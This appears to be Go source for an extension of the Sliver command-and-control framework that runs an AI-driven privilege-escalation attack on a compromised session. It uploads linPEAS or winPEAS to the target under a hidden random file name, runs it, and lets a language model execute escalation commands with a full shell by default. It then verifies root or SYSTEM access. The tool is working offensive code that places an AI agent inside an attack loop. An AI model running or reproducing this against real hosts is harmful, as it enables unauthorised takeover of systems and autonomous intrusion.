package sliver

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"errors"
	"fmt"
	"strconv"
	"strings"
	"time"

	"sliverreshine/internal/ai"
)

// The AI privilege-escalation run.
//
// It is the collection run's sibling and shares its command loop, its progress
// channel and its step shape. What differs is the shape of the work:
//
//	enumerate  -> upload and run the platform's enumeration helper
//	plan       -> hand the enumeration to the model and let it choose a route
//	act        -> run the model's commands until it escalates or runs out
//	verify     -> ask the target what privilege the session now holds
//
// The run ends when the model reports it is done -- which it is instructed to
// do when it has escalated or when every route it can see has failed -- or when
// the step ceiling stops a run that will not terminate on its own.
//
// Read-only policy: escalation is not a read-only activity, so this run is not
// gated by the collection policy by default. The console's own enumeration
// helper is uploaded and run regardless; a model that is held to the read-only
// allowlist can still name the routes it sees, but a command that changes state
// is refused before it reaches the target. A caller that wants that behaviour
// sets ReadOnly; nothing here decides it on the operator's behalf beyond the
// default that the feature would otherwise not do what it says.

const (
	// DefaultAIPrivescSteps is what a run does when the caller does not say.
	// Escalation is more exploratory than collection, so the budget matches it.
	DefaultAIPrivescSteps = 40
	// MaxAIPrivescSteps is the hard ceiling on one run.
	MaxAIPrivescSteps = 100
	// privescEnumModelBytes bounds how much enumeration output is handed to the
	// model. The helper prints its most valuable findings first, so the head of
	// the output is the part worth spending context on.
	privescEnumModelBytes = 48 << 10
	// privescEnumViewBytes bounds how much of the enumeration output is kept in
	// the result for the operator to read.
	privescEnumViewBytes = 24 << 10
)

// AIPrivescRequest is one escalation run against a session.
type AIPrivescRequest struct {
	// SessionID is the live session to escalate.
	SessionID string `json:"session_id"`
	// Objective narrows the run, e.g. "get root without rebooting".
	Objective string `json:"objective"`
	// MaxSteps bounds how many commands the model may propose. Zero uses the
	// default; values above the ceiling are clamped rather than refused.
	MaxSteps int `json:"max_steps"`
	// ReadOnly holds the model to the read-only allowlist. Nil means off: an
	// escalation run that cannot change state cannot escalate, so the default
	// for this feature is the full shell. It is a pointer so a caller that
	// wants the policy enforced says so explicitly.
	ReadOnly *bool `json:"read_only"`
	// DryRun plans without uploading, running or changing anything.
	DryRun bool `json:"dry_run"`
	// SkipEnum goes straight to the model with no enumeration helper, for a
	// target where the download or the upload is not wanted.
	SkipEnum bool `json:"skip_enum"`
	// RefreshTool forces a fresh download instead of the cached asset.
	RefreshTool bool `json:"refresh_tool"`
	// KeepTool leaves the uploaded helper on the target. By default it is
	// removed when the run ends, so a target is not left with a tool the
	// operator did not ask for.
	KeepTool bool `json:"keep_tool"`
	// Progress receives events as the run proceeds. It is not part of the wire
	// format: the HTTP handler attaches it after decoding.
	Progress AIProgress `json:"-"`
}

// AIPrivescTool records what happened to the enumeration helper.
type AIPrivescTool struct {
	Name       string `json:"name,omitempty"`
	Asset      string `json:"asset,omitempty"`
	URL        string `json:"url,omitempty"`
	RemotePath string `json:"remotePath,omitempty"`
	Bytes      int    `json:"bytes,omitempty"`
	Cached     bool   `json:"cached,omitempty"`
	Skipped    bool   `json:"skipped,omitempty"`
	Removed    bool   `json:"removed,omitempty"`
	Error      string `json:"error,omitempty"`
}

// AIPrivescResult is the whole run.
type AIPrivescResult struct {
	Steps   []AICollectStep `json:"steps"`
	Summary string          `json:"summary,omitempty"`
	Stopped string          `json:"stopped"`
	Model   string          `json:"model"`
	// Platform is the OS the run planned for, lower-cased.
	Platform string `json:"platform"`
	// ReadOnly reports whether the model's commands were policy-checked.
	ReadOnly bool `json:"read_only"`
	DryRun   bool `json:"dry_run"`
	// Escalated is the verified outcome: the run demonstrated root, SYSTEM or
	// high integrity. It is established against the target rather than taken
	// from the model's own claim, and it is true either when the session itself
	// held the elevated identity when the run finished or when a step in the
	// run produced elevated output. A one-shot escape such as `sudo find -exec`
	// leaves the session's own identity unchanged, so the two cases are
	// distinguished by EscalatedVia.
	Escalated bool `json:"escalated"`
	// EscalatedVia says how Escalated was established: "session" when the
	// session held the elevated identity, "route" when a step demonstrated it
	// without the session changing identity, and empty when nothing was
	// demonstrated. It tells an operator whether the shell they are holding is
	// privileged or only the route was.
	EscalatedVia string `json:"escalated_via,omitempty"`
	// Evidence is the output that established the outcome.
	Evidence string        `json:"evidence,omitempty"`
	Tool     AIPrivescTool `json:"tool"`
}

// AIPrivesc runs a bounded escalation attempt against a session.
func (c *Client) AIPrivesc(ctx context.Context, p ai.Provider, req AIPrivescRequest) (*AIPrivescResult, error) {
	if p == nil || !p.Configured() {
		return nil, ai.ErrNotConfigured
	}
	req.SessionID = strings.TrimSpace(req.SessionID)
	if req.SessionID == "" {
		return nil, errors.New("missing session id")
	}
	steps := req.MaxSteps
	if steps <= 0 {
		steps = DefaultAIPrivescSteps
	}
	if steps > MaxAIPrivescSteps {
		steps = MaxAIPrivescSteps
	}

	readOnly := req.ReadOnly != nil && *req.ReadOnly

	goos, arch := c.sessionPlatform(req.SessionID)
	platform := strings.ToLower(strings.TrimSpace(goos))
	if platform == "" {
		platform = "linux"
	}

	result := &AIPrivescResult{
		Steps:    make([]AICollectStep, 0, steps+2),
		Model:    p.Info().Model,
		Platform: platform,
		ReadOnly: readOnly,
		DryRun:   req.DryRun,
	}
	emitAI(req.Progress, AIEvent{Type: AIEventStatus, Text: fmt.Sprintf("target platform: %s/%s", platform, arch)})

	// Phase one: enumerate.
	var enumOutput string
	if req.DryRun {
		result.Tool.Skipped = true
		emitAI(req.Progress, AIEvent{Type: AIEventStatus, Text: "dry run: the enumeration helper is not fetched or uploaded"})
	} else if req.SkipEnum {
		result.Tool.Skipped = true
		emitAI(req.Progress, AIEvent{Type: AIEventStatus, Text: "enumeration helper skipped; the model will enumerate by hand"})
	} else {
		output, step := c.runPrivescEnumeration(ctx, req.SessionID, goos, arch, req, &result.Tool)
		enumOutput = output
		if step != nil {
			emitAIStepPair(req.Progress, step)
			result.Steps = append(result.Steps, *step)
		}
	}

	// Phase two: let the model plan and act on what it has.
	emitAI(req.Progress, AIEvent{Type: AIEventStatus, Text: "analysing the enumeration and choosing a route"})
	conversation := ai.NewConversation(aiPrivescSystemPrompt(readOnly, platform))
	conversation.User(aiPrivescTaskPrompt(c.describeSession(req.SessionID), req.Objective, steps, readOnly, enumOutput))

	run := c.runAICommandLoop(ctx, p, conversation, aiRunConfig{
		sessionID: req.SessionID,
		steps:     steps,
		readOnly:  readOnly,
		dryRun:    req.DryRun,
		progress:  req.Progress,
	})
	result.Steps = append(result.Steps, run.steps...)
	result.Stopped = run.stopped
	result.Summary = run.summary
	if run.summary != "" {
		emitAI(req.Progress, AIEvent{Type: AIEventSummary, Text: run.summary})
	}

	// Phase three: ask the target what privilege the session holds now. The
	// model's own claim that it escalated is not evidence.
	if !req.DryRun {
		emitAI(req.Progress, AIEvent{Type: AIEventStatus, Text: "verifying the session's privilege level"})
		check := AICollectStep{Command: privescCheckCommand(platform), Reason: "Verify the privilege level after the run."}
		elevated, evidence, err := c.privescCheck(ctx, req.SessionID, platform)
		if err != nil {
			check.Error = err.Error()
		} else {
			check.Output = evidence
		}
		emitAIStepPair(req.Progress, &check)
		result.Steps = append(result.Steps, check)
		result.Escalated = elevated
		result.Evidence = evidence
		if elevated {
			result.EscalatedVia = privescViaSession
		} else if ok, ev := privescRouteEvidence(run.steps, platform); ok {
			// The session is still the unprivileged user, but a command the model
			// ran produced elevated output: a one-shot escape proves the route
			// even though it did not change the identity of the shell. Reporting
			// a flat "not escalated" here would read as a failed run when the
			// route in fact worked, so the route is recorded and said out loud.
			result.Escalated = true
			result.EscalatedVia = privescViaRoute
			result.Evidence = ev
			emitAI(req.Progress, AIEvent{Type: AIEventStatus, Text: "the escalation route produced elevated output; the session's own identity is unchanged"})
		}
	}

	// Phase four: leave the target as it was found, unless told otherwise.
	if !req.DryRun && !req.KeepTool && result.Tool.RemotePath != "" && result.Tool.Error == "" {
		if err := c.Rm(req.SessionID, result.Tool.RemotePath, false); err != nil {
			emitAI(req.Progress, AIEvent{Type: AIEventStatus, Text: "could not remove " + result.Tool.RemotePath + ": " + err.Error()})
		} else {
			result.Tool.Removed = true
			emitAI(req.Progress, AIEvent{Type: AIEventStatus, Text: "removed " + result.Tool.RemotePath})
		}
	}

	if result.Steps == nil {
		result.Steps = []AICollectStep{}
	}
	if result.Stopped == "" {
		result.Stopped = "step limit reached"
	}
	return result, nil
}

// runPrivescEnumeration fetches the helper, uploads it and runs it. It returns
// the output for the model and, when something actually ran, a step for the
// operator's view. A failure at any stage is recorded on the tool and reported
// as a status event rather than aborting the run: the model can still work from
// a manual enumeration, and a run that dies because GitHub was slow is worse
// than one that says so and continues.
func (c *Client) runPrivescEnumeration(ctx context.Context, sessionID, goos, arch string, req AIPrivescRequest, rec *AIPrivescTool) (string, *AICollectStep) {
	tool, err := linpeasToolFor(goos, arch)
	if err != nil {
		rec.Error = err.Error()
		emitAI(req.Progress, AIEvent{Type: AIEventStatus, Text: err.Error() + "; the model will enumerate by hand"})
		return "", nil
	}
	rec.Name = tool.Name
	rec.Asset = tool.Asset
	rec.URL = linpeasReleaseURL(tool)

	emitAI(req.Progress, AIEvent{Type: AIEventStatus, Text: "fetching " + tool.Asset})
	blob, cached, note, err := fetchLinpeas(ctx, tool, req.RefreshTool)
	if err != nil {
		rec.Error = err.Error()
		emitAI(req.Progress, AIEvent{Type: AIEventStatus, Text: err.Error() + "; the model will enumerate by hand"})
		return "", nil
	}
	if note != "" {
		emitAI(req.Progress, AIEvent{Type: AIEventStatus, Text: note})
	}
	rec.Bytes = len(blob)
	rec.Cached = cached
	if cached {
		emitAI(req.Progress, AIEvent{Type: AIEventStatus, Text: fmt.Sprintf("using cached %s (%d bytes)", tool.Asset, len(blob))})
	} else {
		emitAI(req.Progress, AIEvent{Type: AIEventStatus, Text: fmt.Sprintf("downloaded %s (%d bytes)", tool.Asset, len(blob))})
	}

	remote, err := c.uploadPrivescTool(sessionID, tool, blob, req.Progress)
	if err != nil {
		rec.Error = err.Error()
		emitAI(req.Progress, AIEvent{Type: AIEventStatus, Text: err.Error() + "; the model will enumerate by hand"})
		return "", nil
	}
	rec.RemotePath = remote

	command := privescEnumCommand(tool, remote)
	emitAI(req.Progress, AIEvent{Type: AIEventStatus, Text: "running " + tool.Name + " on the target; this can take a minute"})
	res, err := c.ShellCommand(sessionID, command)
	step := &AICollectStep{
		Command: command,
		Reason:  "Enumerate the target for privilege-escalation routes.",
	}
	if err != nil {
		step.Error = err.Error()
		rec.Error = "run: " + err.Error()
		return "", step
	}
	output := joinExecOutput(res)
	step.Status = res.Status
	step.Output = clampText(output, privescEnumViewBytes)
	if strings.TrimSpace(output) == "" {
		rec.Error = "the enumeration helper produced no output"
	}
	return clampText(output, privescEnumModelBytes), step
}

// uploadPrivescTool copies the helper onto the target and returns the path it
// landed at.
//
// A POSIX target gets a hidden name in its temporary directory. A Windows
// target gets the system temp directory first, which users may write to by
// default; if that is refused the public profile directory is tried, because a
// non-administrative session is exactly the one this feature is run against and
// it cannot write to C:\Windows.
func (c *Client) uploadPrivescTool(sessionID string, tool linpeasTool, blob []byte, progress AIProgress) (string, error) {
	candidates := privescRemoteCandidates(tool)
	var lastErr error
	for _, remote := range candidates {
		emitAI(progress, AIEvent{Type: AIEventStatus, Text: "uploading " + tool.Name + " to " + remote})
		if err := c.Upload(sessionID, remote, blob); err != nil {
			lastErr = fmt.Errorf("upload %s: %w", remote, err)
			continue
		}
		return remote, nil
	}
	return "", lastErr
}

// privescRemoteCandidates lists the paths the helper is tried at, in order.
func privescRemoteCandidates(tool linpeasTool) []string {
	if tool.Windows {
		return []string{
			`C:\Windows\Temp\` + tool.Name,
			`C:\Users\Public\` + tool.Name,
		}
	}
	return []string{"/tmp/." + randomToken() + "_" + tool.Name}
}

// randomToken returns a short random hex string for the uploaded helper's name.
// A fixed name would collide between two runs against the same host and would
// be a known indicator; the token is not a secret, only a collision-avoider.
func randomToken() string {
	var buf [6]byte
	if _, err := rand.Read(buf[:]); err != nil {
		// A collision here costs one failed upload, and the clock still
		// separates two runs, so this is a fallback rather than a failure.
		return strconv.FormatInt(time.Now().UnixNano()&0xffffff, 36)
	}
	return hex.EncodeToString(buf[:])
}

// privescEnumCommand is how the uploaded helper is started.
//
// The POSIX form makes the copy executable and then runs it, falling back to
// the system shell when the script's own interpreter is missing. The Windows
// form runs the executable directly: it is already a PE, and there is no
// interpreter to fall back to.
func privescEnumCommand(tool linpeasTool, remote string) string {
	if tool.Windows {
		return remote
	}
	return "chmod +x " + remote + " 2>/dev/null; " + remote + " || sh " + remote
}

// privescCheckCommand is the verification the operator sees.
func privescCheckCommand(platform string) string {
	if strings.Contains(platform, "windows") {
		return `whoami /groups | findstr /i "S-1-16-12288 S-1-16-16384 S-1-5-18"`
	}
	return "id"
}

// privescCheck asks the target what privilege the session holds.
//
// It runs the console's own command rather than the model's, because the point
// is to check the model's claim. The command only reads.
func (c *Client) privescCheck(ctx context.Context, sessionID, platform string) (bool, string, error) {
	res, err := c.ShellCommand(sessionID, privescCheckCommand(platform))
	if err != nil {
		return false, "", err
	}
	out := strings.TrimSpace(joinExecOutput(res))
	if strings.Contains(platform, "windows") {
		// findstr prints a matching group SID only when the token is present,
		// so any output at all means high integrity or SYSTEM.
		return out != "", out, nil
	}
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "uid=0(") {
			return true, line, nil
		}
	}
	return false, out, nil
}

// How a run established that it escalated.
const (
	// privescViaSession means the session held the elevated identity when the
	// run finished.
	privescViaSession = "session"
	// privescViaRoute means a command the model ran produced elevated output
	// without the session changing identity.
	privescViaRoute = "route"
)

// privescRouteEvidence looks for elevated output among the commands the model
// ran itself.
//
// The session-level check above is authoritative for the identity of the
// shell, but a one-shot escape -- `sudo find -exec`, a SUID helper, a
// scheduled job -- proves the route without leaving the shell privileged. The
// scan is deliberately narrow so an enumeration helper that merely mentions
// root is not read as an escalation: it requires the exact shape `id` prints
// (`uid=0(` on a line that also carries `gid=`) or a Windows integrity SID,
// it only looks at commands that ran to completion, and it skips refused and
// failed steps. The most recent match wins, because a later command is the
// one that is closest to the state the run ended in.
func privescRouteEvidence(steps []AICollectStep, platform string) (bool, string) {
	windows := strings.Contains(platform, "windows")
	for i := len(steps) - 1; i >= 0; i-- {
		step := steps[i]
		if step.Refused || step.Error != "" || step.Status != 0 || step.Output == "" {
			continue
		}
		for _, line := range strings.Split(step.Output, "\n") {
			line = strings.TrimSpace(line)
			if line == "" {
				continue
			}
			if windows {
				if strings.Contains(line, "S-1-5-18") || strings.Contains(line, "S-1-16-12288") || strings.Contains(line, "S-1-16-16384") {
					return true, line
				}
				continue
			}
			if strings.HasPrefix(line, "uid=0(") && strings.Contains(line, "gid=") {
				return true, line
			}
		}
	}
	return false, ""
}

// sessionPlatform reports the OS and architecture of a session, falling back to
// the cached OS and an empty architecture. A lookup failure is not fatal: the
// caller has a sane default and the model is told the platform it is on.
func (c *Client) sessionPlatform(id string) (goos, arch string) {
	if sessions, err := c.Sessions(); err == nil {
		for _, s := range sessions {
			if s.ID == id {
				return s.OS, s.Arch
			}
		}
	}
	if name, ok := c.sessionOS(id); ok {
		return name, ""
	}
	return "", ""
}

// emitAIStepPair publishes a step that the console ran itself, in the same
// command-then-step order the model's steps use, so a consumer that pairs the
// two events does not have to special-case it.
func emitAIStepPair(progress AIProgress, step *AICollectStep) {
	announce := *step
	announce.Output = ""
	announce.Status = 0
	announce.Error = ""
	announce.Refused = false
	announce.Refusal = ""
	emitAI(progress, AIEvent{Type: AIEventCommand, Step: &announce})
	emitAI(progress, AIEvent{Type: AIEventStep, Step: step})
}

// clampText caps a string, cutting at a line boundary where one is close enough
// to the limit that the result stays readable, and saying so when it cut.
func clampText(s string, limit int) string {
	if limit <= 0 || len(s) <= limit {
		return s
	}
	cut := s[:limit]
	if i := strings.LastIndexByte(cut, '\n'); i > limit/2 {
		cut = cut[:i]
	}
	return cut + "\n[output truncated at " + strconv.Itoa(limit) + " bytes]"
}
